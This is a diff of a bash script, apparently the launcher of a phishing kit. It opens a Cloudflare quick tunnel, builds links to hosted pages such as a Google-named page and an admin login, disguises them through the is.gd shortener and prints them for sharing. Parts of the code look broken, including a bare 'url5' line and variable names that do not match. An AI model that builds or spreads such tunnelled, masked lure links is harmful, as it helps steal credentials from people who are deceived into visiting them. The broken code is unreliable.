@@ -571,9 +571,8 @@ cloudflared_start() {
 	{ sleep 12; clear; header; }
 cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
 url_="${cldflr_url}/Directory.php"
-url_0="${cldflr_url}/main.php"
-url_1="${cldflr_url}/public/taco2.php"
-url_2="${cldflr_url}/admin/link.php"
+url_0="${cldflr_url}/admin/login.php"
+url_1="${cldflr_url}/admin/tswift/taco2.php"
 url_3="${cldflr_url}/public/Google/GO.php"
 url_4="${cldflr_url}/public/Google/GO1.php"
 url_5="${cldflr_url}/public/dodge/dodge1.php"
@@ -584,14 +583,10 @@ url3=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_3")
 url4=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_4")
 url5
 echo -e "${RED}=================================================="
-echo -e "${WHITE} main             $url0    "
+echo -e "${WHITE}      $url0    "
 echo -e "${RED}=================================================="
-echo -e "${WHITE} admin/taco       $url1    "
-echo -e "${RED}=================================================="
-echo -e "${WHITE} pu/de/ma.php     $url2    "
-echo -e "${RED}=================================================="
-echo -e "${WHITE} pu/GO            $url3    "
-echo -e "${RED}=================================================="
+echo -e "${WHITE}      $url1    "
+
 ${ORANGEBG}
 }
 
